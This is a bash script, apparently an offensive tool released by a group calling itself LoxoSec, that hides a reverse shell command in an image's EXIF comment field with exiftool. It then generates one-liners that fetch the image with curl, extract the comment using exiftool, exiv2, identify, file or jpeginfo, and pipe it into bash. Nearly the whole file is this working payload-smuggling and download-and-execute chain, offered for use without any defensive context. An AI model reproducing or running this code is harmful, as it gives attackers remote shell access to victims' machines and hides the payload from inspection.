#!/bin/bash
#
# LoxoSec
# git5
#------------------------------------------------
# Whatsapp group (Latin/Hispanic/International)
# https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj
# ------------------------------------------------
# Website
# https://www.LoxoSec.rf.gd
# ------------------------------------------------
# Github
# https://github.com/git5loxosec
# ------------------------------------------------

show_help() {
    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <IMAGE_FILENAME>"
    echo "Inject a reverse shell command into an image and generate a one-liner execution method."
    echo ""
    echo "Options:"
    echo "  -h, --help           Display this help message."
    echo ""
    echo "Arguments:"
    echo "  <REVERSE_SHELL_COMMAND> The reverse shell command to inject."
    echo "  <IMAGE_FILENAME>     The name of the image file."
    echo ""
}

if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    show_help
    exit 0
fi


if [ $# -ne 2 ]; then
    echo "Error: Invalid number of arguments."
    show_help
    exit 1
fi

command="$1"
image_filename="$2"

exiftool -Comment="$command" "$image_filename"

echo "Command injection completed."

read -p "Enter the URL path to the image file (e.g., http://www.example.com/): " image_url

echo "Choose a one-liner execution method:"
echo "1. exiftool-one-liner"
echo "2. exiv2-one-liner"
echo "3. identify-one-liner"
echo "4. file-grep-one-liner"
echo "5. jpeginfo-grep-one-liner"
read -p "Enter the method number (1-5): " method_choice

case "$method_choice" in
    1)
        echo -e "\e[34mGenerating one-liner method with exiftool..."
        one_liner="curl -s '$image_url' | exiftool -Comment -b - | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    2)
        echo -e "\e[34mGenerating one-liner method with exiv2..."
        one_liner="curl -s '$image_url' | exiv2 -p c | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    3)
        echo -e "\e[34mGenerating one-liner method with identify..."
        one_liner="curl -s '$image_url' | identify -format '%c' | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    4)
        echo -e "\e[34mGenerating one-liner method with file and grep..."
        one_liner="curl -s '$image_url' | file - | grep -o 'comment: \".*\"' | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    5)
        echo -e "\e[34mGenerating one-liner method with jpeginfo and grep..."
        one_liner="curl -s '$image_url' | jpeginfo -ls - | grep -o '/bin/sh [^\"']*' | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    *)
        echo "Invalid method choice."
        ;;
esac
